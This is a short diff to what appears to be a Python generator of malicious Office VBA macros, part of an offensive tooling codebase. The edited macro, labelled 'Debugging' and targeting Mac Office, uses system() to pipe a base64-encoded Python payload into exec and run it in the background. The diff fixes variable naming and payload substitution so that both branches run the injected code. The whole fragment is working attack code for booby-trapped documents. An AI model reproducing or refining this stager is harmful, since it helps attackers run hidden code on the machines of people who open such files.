@@ -115,8 +115,6 @@ End Sub
 
 Public Function Debugging() As Variant
     On Error Resume Next
-            Dim tracking As String
-            tracking = "%s"
             #If Mac Then
                 'Mac Rendering
                 If Val(Application.Version) >= 15.33 Then
@@ -127,13 +125,13 @@ Public Function Debugging() As Variant
                     result = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python &")
                 Else
                     Dim result2 As Long
-                    Dim cmd As String
+                    Dim cmd2 As String
                     %s
-                    MsgBox("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python &")
-                    result2 = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python &")
+                    MsgBox("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd2 & \" \\\"\"));"" | python &")
+                    result2 = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd2 & \" \\\"\"));"" | python &")
                 End If
 
             #End If
-End Function""" %(payload)
+End Function""" %(payload, payload)
 
             return macro
